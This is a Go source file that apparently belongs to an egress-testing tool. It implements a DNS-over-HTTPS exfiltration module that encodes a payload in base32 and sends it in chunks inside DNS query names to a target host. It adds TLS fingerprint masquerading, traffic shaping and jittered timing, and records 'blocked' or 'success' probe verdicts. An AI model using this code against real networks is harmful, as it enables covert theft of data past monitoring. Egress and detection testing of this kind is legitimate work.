package dns

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base32"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	mdns "github.com/miekg/dns"
	"github.com/shehzade/contraband/pkg/client/exfil"
	"github.com/shehzade/contraband/pkg/common"
)

// DoHExfiltrator implements DNS over HTTPS (RFC 8484) with uTLS ClientHello masquerading.
type DoHExfiltrator struct{}

func NewDoHExfiltrator() *DoHExfiltrator {
	return &DoHExfiltrator{}
}

func init() {
	exfil.RegisterExfiltrator(common.ProtoDoH, NewDoHExfiltrator())
}

func (e *DoHExfiltrator) Protocol() string {
	return common.ProtoDoH
}

func (e *DoHExfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.TLSProfile = opts.TLSFingerprint
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	payload, err := io.ReadAll(reader)
	if err != nil {
		return nil, fmt.Errorf("failed to read payload: %w", err)
	}
	result.TargetVolume = int64(len(payload))

	if opts.ExpectedHash == "" {
		h := sha256.Sum256(payload)
		opts.ExpectedHash = hex.EncodeToString(h[:])
	}
	result.PayloadHash = opts.ExpectedHash

	if opts.SessionToken.IsZero() {
		tok, tokErr := common.NewSessionToken()
		if tokErr != nil {
			return nil, tokErr
		}
		opts.SessionToken = tok
	}

	dnsChunkSize := 32
	if opts.ChunkSize > 0 && opts.ChunkSize < 32 {
		dnsChunkSize = opts.ChunkSize
	}

	var rawChunks [][]byte
	if len(payload) == 0 {
		rawChunks = [][]byte{{}}
	} else {
		for i := 0; i < len(payload); i += dnsChunkSize {
			end := i + dnsChunkSize
			if end > len(payload) {
				end = len(payload)
			}
			rawChunks = append(rawChunks, payload[i:end])
		}
	}
	totalChunks := uint32(len(rawChunks))

	domain := opts.Headers["domain"]
	if domain == "" {
		domain = "contraband.local"
	}
	domain = strings.TrimSuffix(domain, ".")

	isTLS := opts.UseTLS || (opts.TargetPort != 80 && opts.InsecureTLS) || opts.TargetPort == 443 || opts.TargetPort == 8443 || opts.TargetPort == 9443 || opts.TargetPort == 10443
	scheme := "http"
	if isTLS {
		scheme = "https"
	}
	dohURL := fmt.Sprintf("%s://%s:%d/dns-query", scheme, opts.TargetHost, opts.TargetPort)

	var httpClient *http.Client
	if isTLS {
		tlsCfg := exfil.TLSConfig{
			ServerName:         opts.TargetHost,
			InsecureSkipVerify: opts.InsecureTLS,
			Fingerprint:        opts.TLSFingerprint,
			ALPN:               []string{"http/1.1"},
		}
		tr := exfil.NewHTTPTransport(tlsCfg)
		if opts.ProxyDialer != nil {
			tr.DialContext = opts.ProxyDialer.DialContext
		}
		httpClient = &http.Client{Transport: tr, Timeout: opts.Timeout}
	} else {
		tr := &http.Transport{
			MaxIdleConns:        100,
			IdleConnTimeout:     90 * time.Second,
			TLSHandshakeTimeout: 10 * time.Second,
		}
		if opts.ProxyDialer != nil {
			tr.DialContext = opts.ProxyDialer.DialContext
		}
		httpClient = &http.Client{Transport: tr, Timeout: opts.Timeout}
	}

	b32Enc := base32.StdEncoding.WithPadding(base32.NoPadding)

	result.Timestamps.ConnectedTCP = time.Now().UTC()
	result.Timestamps.FirstByteSent = time.Now().UTC()

	for seq := uint32(1); seq <= totalChunks; seq++ {
		chunkData := rawChunks[seq-1]
		b32Chunk := b32Enc.EncodeToString(chunkData)
		if b32Chunk == "" {
			b32Chunk = "A"
		}

		fqdn := fmt.Sprintf("%d.%d.%s.%s.%s.", seq, totalChunks, opts.SessionToken.String(), b32Chunk, domain)
		msg := new(mdns.Msg)
		msg.SetQuestion(fqdn, mdns.TypeA)
		msg.RecursionDesired = false

		packedMsg, packErr := msg.Pack()
		if packErr != nil {
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = fmt.Sprintf("failed to pack DNS message: %v", packErr)
			calculateDurations(&result)
			return &result, packErr
		}

		req, reqErr := http.NewRequestWithContext(ctx, http.MethodPost, dohURL, bytes.NewReader(packedMsg))
		if reqErr != nil {
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = reqErr.Error()
			calculateDurations(&result)
			return &result, reqErr
		}

		req.Header.Set("Content-Type", "application/dns-message")
		req.Header.Set("Accept", "application/dns-message")
		for k, v := range opts.Headers {
			if !strings.EqualFold(k, "domain") {
				req.Header.Set(k, v)
			}
		}

		resp, httpErr := httpClient.Do(req)
		if httpErr != nil {
			result.Verdict = classifyError(httpErr)
			result.ErrorMessage = httpErr.Error()
			calculateDurations(&result)
			return &result, httpErr
		}

		respBody, readErr := io.ReadAll(resp.Body)
		_ = resp.Body.Close()

		if readErr != nil {
			result.Verdict = classifyError(readErr)
			result.ErrorMessage = fmt.Sprintf("failed to read DoH response body: %v", readErr)
			calculateDurations(&result)
			return &result, readErr
		}

		result.BytesSent += int64(len(packedMsg))
		result.BytesRecv += int64(len(respBody))

		if resp.StatusCode != http.StatusOK {
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = fmt.Sprintf("DoH server returned status %d: %s", resp.StatusCode, string(respBody))
			calculateDurations(&result)
			return &result, errors.New(result.ErrorMessage)
		}

		respMsg := new(mdns.Msg)
		if err := respMsg.Unpack(respBody); err != nil {
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = fmt.Sprintf("failed to unpack DoH DNS response: %v", err)
			calculateDurations(&result)
			return &result, err
		}

		var ackConfirmed bool
		for _, ans := range respMsg.Answer {
			if aRecord, ok := ans.(*mdns.A); ok && aRecord.A != nil {
				ip := aRecord.A.To4()
				if ip != nil && ip[0] == 127 {
					ackSeq := uint32(ip[1])<<16 | uint32(ip[2])<<8 | uint32(ip[3])
					if ackSeq == seq {
						ackConfirmed = true
						break
					}
				}
			}
		}

		if !ackConfirmed {
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = fmt.Sprintf("invalid DoH sequence ACK for chunk %d", seq)
			calculateDurations(&result)
			return &result, errors.New(result.ErrorMessage)
		}

		if opts.Shaper != nil {
			if err := opts.Shaper.WaitN(ctx, len(chunkData)); err != nil {
				result.Verdict = classifyError(err)
				result.ErrorMessage = err.Error()
				calculateDurations(&result)
				return &result, err
			}
		}
		if opts.Cadence != nil {
			delay := opts.Cadence.NextDelay()
			if delay > 0 {
				select {
				case <-time.After(delay):
				case <-ctx.Done():
					result.Verdict = classifyError(ctx.Err())
					result.ErrorMessage = ctx.Err().Error()
					calculateDurations(&result)
					return &result, ctx.Err()
				}
			}
		}
	}

	result.Timestamps.AckReceived = time.Now().UTC()
	result.Timestamps.TeardownDone = time.Now().UTC()
	result.Verdict = common.VerdictSuccess
	result.RawEvidence = common.FormatBoundedRawEvidence(payload)

	calculateDurations(&result)
	return &result, nil
}
